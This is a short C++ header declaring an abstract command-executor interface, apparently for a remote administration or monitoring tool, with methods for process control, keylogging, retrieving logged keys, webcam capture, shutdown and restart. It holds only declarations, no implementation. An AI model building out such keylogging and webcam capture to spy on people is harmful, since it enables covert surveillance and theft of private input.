#pragma once
#include <string>
#include <vector>

class ICommandExecutor {
public:
    virtual ~ICommandExecutor() {}

    virtual std::string ListProcess() = 0; 
        virtual void StartProcess(std::string name) = 0; 
        virtual void StopProcess(std::string name) = 0; 
        virtual void StartKeyLogging() = 0; 
        virtual std::string GetLoggedKeys() = 0;
        virtual std::vector<uint8_t> CaptureWebcam(int duration) = 0; 
        virtual void Shutdown() = 0;
        virtual void Restart() = 0; 
};